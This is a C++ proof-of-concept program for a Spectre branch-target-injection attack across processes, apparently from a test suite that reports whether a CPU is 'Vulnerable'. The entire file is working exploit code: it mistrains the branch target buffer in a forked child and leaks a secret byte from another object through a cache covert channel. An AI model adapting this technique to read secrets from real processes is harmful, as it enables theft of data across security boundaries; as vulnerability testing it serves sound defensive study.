#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

extern "C"
{
#include "libcache/cache.h"
#include "lib/global.h"
}

#define SECRET 'S'

// Base class
class Animal
{
public:
    virtual void move()
    {
    }
};

// Bird contains the secret
class Bird : public Animal
{
private:
    char secret;

public:
    Bird()
    {
        secret = SECRET;
    }
    void move()
    {
        // nop
    }
};

// Class that contains the function to leak data
class Fish : public Animal
{
private:
    char data;

public:
    Fish()
    {
        data = 'F';
    }
    void move()
    {
        //Encode data in the cache
        cache_encode(data);
    }
};

// Function so that we always call animal->move from the same virtual address
// required for indexing always the same BTB entry
void move_animal(Animal *animal)
{
    animal->move();
}

int main(int argc, char **argv)
{
    PREPARE();
    // Cross-address-space attack, so we fork
    pid_t pid_child = fork();
    int is_child = (pid_child == 0);
    Fish *fish = new Fish();
    Bird *bird = new Bird(); // contains secret

    char *ptr = (char *)((((size_t)move_animal)) & ~(pagesize - 1));
    mprotect(ptr, pagesize * 2, PROT_WRITE | PROT_READ | PROT_EXEC);
    maccess((void *)move_animal);

    // trigger COW for the page containing the function
    ptr[0] = ptr[0];
    start_time = time(NULL);
    int i;
    for (i = 0; i < MAX_TRY_TIMES; i++)
    {
        // Parent is doing the mistraining
        if (is_child)
        {
            nospec();
            // train for fish
            for (int j = 0; j < 10000; j++)
            {
                move_animal(fish);
            }
        }
        // Flush our shared memory
        flush_shared_memory();
        mfence();

        // Increase misspeculation chance
        flush(bird);
        mfence();

        // Child is leaking data
        if (!is_child)
        {
            nospec();
            // Leak bird secret
            move_animal(bird);

            // Recover data from the covert channel
            if (cache_decode() == 'S')
            {
                passed_count++;
            }
            if (time(NULL) - start_time > timeout)
            {
                printf(ANSI_COLOR_YELLOW "Spectre_BTB_ca_ip: Timeout" ANSI_COLOR_RESET "\n");
                kill(pid_child, SIGKILL);
                exit(-1);
            }
        }
    }
    if (!is_child)
    {
        int exit_result = 0;
        if ((double)passed_count / MAX_TRY_TIMES > 0.3)
        {
            printf(ANSI_COLOR_RED "Spectre_BTB_ca_ip: Vulnerable" ANSI_COLOR_RESET "\n");
            exit_result = EXIT_SUCCESS;
        }
        else
        {
            printf(ANSI_COLOR_GREEN "Spectre_BTB_ca_ip: Not Vulnerable" ANSI_COLOR_RESET "\n");
            exit_result = EXIT_FAILURE;
        }
        kill(pid_child, SIGKILL);
        exit(exit_result);
    }
    
}
